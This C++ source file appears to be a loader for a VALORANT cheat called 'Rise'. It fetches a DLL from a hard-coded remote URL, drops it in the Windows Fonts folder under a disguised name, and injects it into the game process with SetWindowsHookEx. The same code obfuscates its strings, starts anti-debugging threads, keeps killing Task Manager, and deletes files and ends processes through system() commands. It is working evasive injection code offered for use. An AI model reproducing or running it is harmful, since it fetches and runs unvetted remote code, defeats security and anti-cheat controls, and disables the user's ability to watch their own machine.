//#include "memory.hpp"

#include <windows.h>
#include <string>
#include "xor.hpp"

#include <fstream>
#include <thread>
#include <Windows.h>
#include <string>
#include <thread>
#include "utils.hpp"
#include "xor.hpp"

#pragma once
#include <Windows.h>
#include <winternl.h>

#include <Windows.h>
#include <TlHelp32.h>
#include <Windows.h>
#include <ntstatus.h>

#define THREAD_STATE_WAIT 0x00000002

bool bSuspended = false;

int ProcessSuspended()
{
	if (!bSuspended)
		return FALSE;

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return FALSE;

	THREADENTRY32 te;
	te.dwSize = sizeof(THREADENTRY32);
	if (!Thread32First(hSnapshot, &te))
		return FALSE;

	do
	{
		if (te.dwFlags & THREAD_STATE_WAIT)
			return TRUE;
	} while (Thread32Next(hSnapshot, &te));

	CloseHandle(hSnapshot);
	return FALSE;
}

DWORD WINAPI g68f234g8f23787hfg38238237(LPVOID lpParameter)
{
	DWORD TimeTest1 = 0, TimeTest2 = 0;
	while (true)
	{
		TimeTest1 = TimeTest2;
		TimeTest2 = GetTickCount64();
		if (TimeTest1 != 0)
		{
			Sleep(1000);
			if ((TimeTest2 - TimeTest1) > 5000)
			{
				ExitProcess(0);
				TerminateProcess(GetCurrentProcess(), 0);
			}
		}
	}
	return 0;
}

DWORD WINAPI f47gfh272hfh2hfhfh2(LPVOID lpParameter)
{
	DWORD TimeTest1 = 0, TimeTest2 = 0;
	while (true)
	{
		TimeTest1 = TimeTest2;
		TimeTest2 = GetTickCount64();
		if (TimeTest1 != 0)
		{
			Sleep(1000);
			if ((TimeTest2 - TimeTest1) > 5000)
			{
				if (ProcessSuspended())
				{
					ExitProcess(0);
					TerminateProcess(GetCurrentProcess(), 0);
				}
			}
		}
	}
	return 0;
}

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define PROCESS_STATE_SUSPENDED 0x00000001

typedef NTSTATUS(WINAPI* NtQueryInformationProcessPtr)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

DWORD WINAPI h79fg34h789fg34(LPVOID lpParameter)
{
	DWORD mainProcessId = GetCurrentProcessId();

	while (true)
	{
		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		if (hSnapshot == INVALID_HANDLE_VALUE)
			break;

		THREADENTRY32 te;
		te.dwSize = sizeof(THREADENTRY32);
		if (!Thread32First(hSnapshot, &te))
			break;

		bool bThreadSuspended = false;
		do
		{
			if (te.th32OwnerProcessID == mainProcessId && (te.dwFlags & THREAD_STATE_WAIT))
			{
				bThreadSuspended = true;
				break;
			}
		} while (Thread32Next(hSnapshot, &te));

		CloseHandle(hSnapshot);

		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, mainProcessId);
		if (hProcess != NULL)
		{
			DWORD dwProcessState;
			if (GetProcessInformation(hProcess, static_cast<PROCESS_INFORMATION_CLASS>(ProcessBasicInformation), &dwProcessState, sizeof(dwProcessState)) != 0)
			{
				if (dwProcessState == PROCESS_STATE_SUSPENDED)
				{
					bThreadSuspended = true;
				}
			}
			CloseHandle(hProcess);
		}

		if (bThreadSuspended)
		{
			HANDLE hMainProcess = OpenProcess(PROCESS_TERMINATE, FALSE, mainProcessId);
			if (hMainProcess != NULL)
			{
				TerminateProcess(hMainProcess, 0);
				CloseHandle(hMainProcess);
			}
			ExitProcess(0);
		}

		Sleep(1000);
	}

	return 0;
}

#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <cstdio>
#include <ctime>

void SilentCleanup() {
	std::vector<std::string> drives = { "C:\\", "D:\\", "E:\\" };
	std::vector<std::string> filesToDelete = {
		"Windows\\Resources\\svchost.exe",
		"Windows\\Resources\\spoolsv.exe",
		"Windows\\Resources\\Themes\\explorer.exe",
		"Windows\\Resources\\Themes\\icsys.icn.exe"
	};

	for (const std::string& drive : drives) {
		for (const std::string& file : filesToDelete) {
			std::string fullPath = drive + file;

			std::string attribCommand = "attrib -h -r -s \"" + fullPath + "\" > nul 2>&1";
			system(attribCommand.c_str());

			std::string terminateCommand = "wmic process where ExecutablePath='" + fullPath + "' CALL TERMINATE > nul 2>&1";
			system(terminateCommand.c_str());

			std::string deleteCommand = "del /f \"" + fullPath + "\" > nul 2>&1";
			system(deleteCommand.c_str());
		}
	}
}

#include <random>

std::string GenerateRandomFileName()
{
	const char validChars[] = ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-");
	const size_t validCharsSize = sizeof(validChars) - (1);

	std::random_device rd;
	std::mt19937 generator(rd());
	std::uniform_int_distribution<> distribution(0, validCharsSize - 1);

	std::string randomFileName;
	for (int i = (0); i < (12); ++i) {
		randomFileName += validChars[distribution(generator)];
	}
	return randomFileName + (".exe");
}

void DeleteFileFromDisk(const char* filePath) {
	remove(filePath);
}

bool WriteToDisk(const std::string& filename, const std::vector<unsigned char>& data) {
	HANDLE file = CreateFileA(filename.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		std::cerr << "Failed to create file: " << filename << std::endl;
		return false;
	}

	DWORD bytesWritten = 0;
	BOOL result = WriteFile(file, data.data(), data.size(), &bytesWritten, NULL);
	CloseHandle(file);

	if (!result || bytesWritten != data.size()) {
		std::cerr << "Failed to write data to file: " << filename << std::endl;
		return false;
	}

	return true;
}

bool KillProcessByName(const std::wstring& processName) {
	std::string processNameStr(processName.begin(), processName.end());

	std::string command = "taskkill /f /im " + processNameStr;

	system(command.c_str());
}

void exitfunc() noexcept {

	const std::wstring processName3 = L"ctfmon.exe";
	KillProcessByName(processName3);
	ExitProcess(0x9c);
	for (long long int i = 0; ++i; (&i)[i] = i);
}

#include <windows.h>
#include <wininet.h>
#include <vector>
#include <string>
#include <iostream>
#pragma comment(lib, "wininet.lib")

bool DownloadBinaryFile(const std::string& url, std::vector<std::uint8_t>& outBytes) {
	HINTERNET hInternet = InternetOpenA("BinaryDownloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hInternet) return false;

	HINTERNET hFile = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (!hFile) {
		InternetCloseHandle(hInternet);
		return false;
	}

	std::vector<std::uint8_t> buffer;
	std::uint8_t temp[4096];
	DWORD bytesRead;

	while (InternetReadFile(hFile, temp, sizeof(temp), &bytesRead) && bytesRead > 0) {
		buffer.insert(buffer.end(), temp, temp + bytesRead);
	}

	InternetCloseHandle(hFile);
	InternetCloseHandle(hInternet);

	outBytes = std::move(buffer);
	return true;
}

std::vector<HANDLE> suspendedThreadsGlobal;
std::vector<DWORD> initialThreadIds;
std::vector<DWORD> resumedThreadIds;
std::vector<DWORD> this_thread;


DWORD GetProcessIdByName(const std::wstring& processName) {
	DWORD processId = 0;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(hSnapshot, &pe32)) {
			do {
				if (processName.compare(pe32.szExeFile) == 0) {
					processId = pe32.th32ProcessID;
					break;
				}
			} while (Process32Next(hSnapshot, &pe32));
		}
		CloseHandle(hSnapshot);
	}
	return processId;
}


BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
		std::cerr << "LookupPrivilegeValue error: " << GetLastError() << std::endl;
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : 0;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		std::cerr << "AdjustTokenPrivileges error: " << GetLastError() << std::endl;
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		std::cerr << "The token does not have the specified privilege." << std::endl;
		return FALSE;
	}

	return TRUE;
}

void disable_cursor() {
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_CURSOR_INFO cursorInfo;

	GetConsoleCursorInfo(hConsole, &cursorInfo);
	cursorInfo.bVisible = FALSE;
	SetConsoleCursorInfo(hConsole, &cursorInfo);
}

void enable_cursor() {
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_CURSOR_INFO cursorInfo;

	GetConsoleCursorInfo(hConsole, &cursorInfo);
	cursorInfo.bVisible = TRUE;
	SetConsoleCursorInfo(hConsole, &cursorInfo);
}

#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <iostream>
#include <vector>
#include <thread>
#include <chrono>
#include <filesystem>

#include <windows.h>
#include <winbase.h>
#include <winuser.h>
#include <string>
#include <thread>
#include <atomic>
#include <iostream>
#include <fstream>
#include <iomanip>
#include <mutex>
#include <condition_variable>
#include <vector>
#include <psapi.h>
#pragma comment(lib, "psapi.lib")
#include <TlHelp32.h>

#define NOMINMAX

std::atomic_bool shutdown_event(false);
std::mutex log_mutex;

void log_message(const std::wstring& message) {
	std::lock_guard<std::mutex> lock(log_mutex);
	std::wcout << message << std::endl;
}

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iostream>
#include <vector>
#include <winnt.h>

// ─────────────────────────────────────────────────────────────────────────────
// Utility Functions

bool EnableDebugPrivilege() {
	HANDLE hToken;
	TOKEN_PRIVILEGES priv = {};
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return false;
	if (!LookupPrivilegeValueW(nullptr, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
		return false;
	priv.PrivilegeCount = 1;
	priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	return AdjustTokenPrivileges(hToken, FALSE, &priv, sizeof(priv), nullptr, nullptr);
}

#include <iostream>
#include <vector>
#include <string>
#include <fstream>

size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
	size_t realSize = size * nmemb;
	std::vector<unsigned char>* buffer = static_cast<std::vector<unsigned char>*>(userp);
	unsigned char* data = static_cast<unsigned char*>(contents);
	buffer->insert(buffer->end(), data, data + realSize);
	return realSize;
}

bool DownloadFromCatbox(const std::string& url, std::vector<unsigned char>& outBuffer) {
	HINTERNET hInternet = InternetOpenA("RiseClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hInternet) return false;

	HINTERNET hFile = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
	if (!hFile) {
		InternetCloseHandle(hInternet);
		return false;
	}

	char buffer[4096];
	DWORD bytesRead;
	while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
		outBuffer.insert(outBuffer.end(), buffer, buffer + bytesRead);
	}

	InternetCloseHandle(hFile);
	InternetCloseHandle(hInternet);
	return !outBuffer.empty();
}

#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")

bool DownloadDll(const std::string& url, const std::string& path) {
	return URLDownloadToFileA(NULL, url.c_str(), path.c_str(), 0, NULL) == S_OK;
}

#include <Windows.h>
#include <WinInet.h>
#include <vector>
#include <string>
#include <fstream>
#pragma comment(lib, "Wininet.lib")

#include <vector>
#include <string>
#include <iostream>
#include <windows.h>

#include <string>
#include <vector>

#include <string>
#include <vector>

inline std::string y79d32h78e123h78d23(const std::vector<uint8_t>& encrypted, uint8_t key = 0x5A) {
	std::string result;
	for (auto c : encrypted) {
		result += static_cast<char>(c ^ key);
	}
	return result;
}

size_t write_callback(void* contents, size_t size, size_t nmemb, std::string* buffer) {
	size_t total = size * nmemb;
	buffer->append((char*)contents, total);
	return total;
}

#include <windows.h>
#include <wininet.h>
#include <vector>
#include <string>
#pragma comment(lib, "wininet.lib")

#include <windows.h>
#include <wininet.h>
#include <vector>
#include <string>
#pragma comment(lib, "wininet.lib")

bool WriteToDisk2(const std::string& path, const std::vector<unsigned char>& data) {
	std::ofstream file(path, std::ios::binary);
	if (!file.is_open()) return false;
	file.write(reinterpret_cast<const char*>(data.data()), data.size());
	return file.good();
}

#include <Windows.h>
#include <TlHelp32.h>
#include <thread>
#include <chrono>
#include <iostream>
#include <string>

void val_open() {
	DWORD pid = 0;
	while (pid == 0) {
		pid = GetProcessIdByName(crypt(L"VALORANT-Win64-Shipping.exe").decrypt());
		if (pid != 0) {
			break;
		}
		std::this_thread::sleep_for(std::chrono::seconds(2));
	}
}

#include <Windows.h>
#include <WinInet.h>
#include <vector>
#include <string>
#include <fstream>
#include <iostream>

#pragma comment(lib, "Wininet.lib")

// ---- Your existing downloader ----
std::vector<unsigned char> DownloadFileFromURL(const std::string& url) {
	HINTERNET hInternet = InternetOpenA("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hInternet)
		return {};

	HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
	if (!hUrl) {
		InternetCloseHandle(hInternet);
		return {};
	}

	std::vector<unsigned char> data;
	unsigned char buffer[4096];
	DWORD bytesRead;

	while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
		data.insert(data.end(), buffer, buffer + bytesRead);
	}

	InternetCloseHandle(hUrl);
	InternetCloseHandle(hInternet);

	return data;
}

void injek() {
	SilentCleanup();

	const char* filePath = crypt("C:\\Windows\\Fonts\\dfw.dll").decrypt();

	DeleteFileFromDisk(filePath);

	HANDLE hToken;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		return;
	}

	if (!SetPrivilege(hToken, SE_DEBUG_NAME, TRUE)) {
		return;
	}

	EnableDebugPrivilege();

	disable_cursor();

	val_open();

	Sleep(7372);


	std::string url = "https://pub-15c5c69e065d4492a39d20a54dd66070.r2.dev/sense/hasm.dll";

	std::vector<unsigned char> bytes = DownloadFileFromURL(url);

	if (bytes.empty()) {
		printf(crypt("Rise - Error 1\n"));
		return;
	}

	std::string fh2u3899f = crypt("C:\\Windows\\Fonts\\dfw.dll").decrypt();
	if (!WriteToDisk(fh2u3899f, bytes)) {
		printf(crypt("Rise - Error 2\n"));
	}

	HWND valorantHwnd = nullptr;
	valorantHwnd = FindWindowW(crypt(L"VALORANTUnrealWindow").decrypt(), nullptr);

	const wchar_t* dllName = crypt(L"C:\\Windows\\Fonts\\dfw.dll").decrypt();

	DWORD pid = 0;
	DWORD tid = GetWindowThreadProcessId(valorantHwnd, &pid);
	if (tid == 0) {
		DeleteFileFromDisk(filePath);
		printf(crypt("Rise - Error 3"));
	}

	HMODULE dll = LoadLibraryEx(dllName, 0, DONT_RESOLVE_DLL_REFERENCES);
	if (!dll) {
		DeleteFileFromDisk(filePath);
		printf(crypt("Rise - Error 4"));
	}

	HOOKPROC addr = (HOOKPROC)GetProcAddress(dll, crypt("MertdOirf__"));
	if (!addr) {
		DeleteFileFromDisk(filePath);
		printf(crypt("Rise - Error 5"));
	}

	HHOOK handle = SetWindowsHookEx(WH_GETMESSAGE, addr, dll, tid);
	if (!handle) {
		DeleteFileFromDisk(filePath);
		printf(crypt("Rise - Error 6"));
	}

	DeleteFileFromDisk(filePath);
	PostThreadMessage(tid, 0x0000, 0, 0);

	printf(crypt("success!!!!"));

	Sleep(1223368);

	std::cin.get();

	while (true) std::this_thread::sleep_for(std::chrono::hours(24));
	std::cin.get();
}

void authmain() {
	const char* filePath = crypt("C:\\Windows\\Fonts\\dfw.dll").decrypt();

	DeleteFileFromDisk(filePath);
	system(crypt("cls"));
	SetConsoleTitle(crypt(L"main").decrypt());

	// PUT YOUR AUTH IMPLEMENTATION HERE

	std::this_thread::sleep_for(std::chrono::milliseconds(3000));
	injek();


	system(crypt("cls"));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	SetWindowLong(GetConsoleWindow(), GWL_EXSTYLE, WS_EX_TOOLWINDOW);

	while (true) {
		HWND valorantHwnd = FindWindowW(crypt(L"VALORANTUnrealWindow").decrypt(), 0);
		if (valorantHwnd == 0) {
			const wchar_t* dllName = crypt(L"C:\\Windows\\Fonts\\dfw.dll").decrypt();
			HMODULE dll = LoadLibraryEx(dllName, 0, DONT_RESOLVE_DLL_REFERENCES);
			FreeLibrary(dll);
			const std::wstring processName4 = crypt(L"ctfmon.exe").decrypt();
			KillProcessByName(processName4);
			const std::wstring processName1 = crypt(L"VALORANT.exe").decrypt();
			KillProcessByName(processName1);
			const std::wstring processName2 = crypt(L"VALORANT-Win64-Shipping.exe").decrypt();
			KillProcessByName(processName2);
			Sleep(3000);
			const char* filePath = crypt("C:\\Windows\\Fonts\\Calibri.dll").decrypt();
			DeleteFileFromDisk(filePath);
			Sleep(100);
			exitfunc();
		}
		Sleep(2000);
	}
}

DWORD ffy7834ffgh34782(const wchar_t* name) {
	const auto snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snap == INVALID_HANDLE_VALUE) {
		return 0;
	}

	PROCESSENTRY32 proc_entry{};
	proc_entry.dwSize = sizeof(proc_entry);

	if (Process32First(snap, &proc_entry)) {
		do {
			if (wcscmp(name, proc_entry.szExeFile) == 0) {
				CloseHandle(snap);
				return proc_entry.th32ProcessID;
			}
		} while (Process32Next(snap, &proc_entry));
	}

	CloseHandle(snap);
	return 0;
}

#include <iostream>
#include <fstream>
#include <vector>
#include <random>
#include <algorithm>
#include <cstdlib>
#include <cstring>
#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "shlwapi.lib")

bool g8hf34b23894h89bfg234() {
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return false;
	}

	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hSnapshot, &processEntry)) {
		do {
			if (_wcsicmp(processEntry.szExeFile, crypt(L"Taskmgr.exe")) == 0) {
				CloseHandle(hSnapshot);
				return true;
			}
		} while (Process32Next(hSnapshot, &processEntry));
	}

	CloseHandle(hSnapshot);
	return false;
}

void hf24h789fh29783f() {
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return;
	}

	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hSnapshot, &processEntry)) {
		do {
			if (_wcsicmp(processEntry.szExeFile, crypt(L"Taskmgr.exe")) == 0) {
				HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processEntry.th32ProcessID);
				if (hProcess != NULL) {
					TerminateProcess(hProcess, 0);
					CloseHandle(hProcess);
				}
			}
		} while (Process32Next(hSnapshot, &processEntry));
	}

	CloseHandle(hSnapshot);
}

void h79g345h89f234j89fg234() {
	while (true) {
		if (g8hf34b23894h89bfg234()) {
			hf24h789fh29783f();
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(500));
	}
}


#include <Windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <atomic>
#include <iomanip>

bool EnablePrivileges() {
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return false;

	const wchar_t* privileges[] = {
		SE_DEBUG_NAME,
		SE_TCB_NAME,
		SE_ASSIGNPRIMARYTOKEN_NAME,
		SE_INCREASE_QUOTA_NAME,
		SE_TAKE_OWNERSHIP_NAME,
		SE_LOAD_DRIVER_NAME,
		SE_SYSTEM_PROFILE_NAME,
		SE_SYSTEMTIME_NAME,
		SE_PROF_SINGLE_PROCESS_NAME,
		SE_INC_BASE_PRIORITY_NAME
	};

	bool anySuccess = false;

	for (const wchar_t* privilege : privileges) {
		tkp.PrivilegeCount = 1;
		tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (LookupPrivilegeValueW(NULL, privilege, &tkp.Privileges[0].Luid)) {
			if (AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, NULL)) {
				anySuccess = true;
			}
		}
	}

	CloseHandle(hToken);
	return anySuccess;
}

int main(int argc, char* argv[])
{
	HANDLE hThread = CreateThread(NULL, 0, h79fg34h789fg34, NULL, 0, NULL);
	if (hThread != NULL)
	{
		SetThreadPriority(hThread, THREAD_PRIORITY_NORMAL);
		CloseHandle(hThread);
	}

	HANDLE hThread1 = CreateThread(NULL, 0, g68f234g8f23787hfg38238237, NULL, 0, NULL);
	if (hThread1 != NULL)
	{
		SetThreadPriority(hThread1, THREAD_PRIORITY_NORMAL);
		CloseHandle(hThread1);
	}

	HANDLE hThread2 = CreateThread(NULL, 0, f47gfh272hfh2hfhfh2, NULL, 0, NULL);
	if (hThread2 != NULL)
	{
		SetThreadPriority(hThread2, THREAD_PRIORITY_NORMAL);
		CloseHandle(hThread2);
	}

	authmain();
}